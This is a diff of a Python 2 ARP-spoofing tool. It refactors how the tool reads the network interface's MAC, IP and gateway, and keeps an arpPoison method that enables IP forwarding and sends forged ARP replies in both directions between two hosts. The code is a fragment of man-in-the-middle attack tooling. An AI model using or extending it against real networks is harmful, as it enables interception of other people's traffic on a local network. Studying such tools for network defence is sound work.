@@ -18,19 +18,6 @@ except ImportError:
     sys.exit("[-] Couldn't import: fcntl")
 
 class Sock:
-    def getMac(self,ifname): #get mac address of iface, only works on unix
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
-        return ''.join(['%02x' % ord(char) for char in info[18:24]])
-
-    def getIp(self, ifname):  #get ip address of iface, only works on unix
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24])
-
-    def getGateway(self,addr):
-        addr = map(int,addr.split('.'))
-        addr[3] = '1'
-        return '.'.join(map(str,addr))
 
     def open_sock(self, iface, timeout = None):
         sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
@@ -57,12 +44,9 @@ class ARP(threading.Thread):
         self.ffMac = '\xff\xff\xff\xff\xff\xff'
         self.enableForwarding()
         try:
-            self.srcMac = binascii.unhexlify(Sock().getMac(self.iface))
-            self.srcIp = Sock().getIp(self.iface)
-            self.gateway = False
-            while self.gateway == False: #esto hay que cambiarlo, es una negrada!
-                self.gateway = self.isOnline(Sock().getGateway(Sock().getIp(self.iface)))
-            print self.gateway
+            self.srcMac = self.iface.hwaddr
+            self.srcIp = self.iface.ip
+            self.gateway = targetObject(self.iface.gateway,self.iface.gwhwaddr)
             self.retdata = True
         except(IOError, OSError):
             self.retdata = False
@@ -89,7 +73,7 @@ class ARP(threading.Thread):
         packet.data = arp
         packet.type = dpkt.ethernet.ETH_TYPE_ARP
         try:
-            sock = Sock().open_sock(self.iface, 0.1)
+            sock = Sock().open_sock(self.iface.name, 0.1)
             sock.send(str(packet))
             buf = sock.recv(0xffff)
         except socket.timeout:
@@ -136,7 +120,7 @@ class ARP(threading.Thread):
 
     def arpPoison(self, src=None, dst=None):
         if (src != None and dst != None):
-            sock = Sock().open_sock(self.iface)
+            sock = Sock().open_sock(self.iface.name)
             sock.send(str(self.buildPoison(src, dst)))
             sock.send(str(self.buildPoison(dst, src)))
             sock.close()
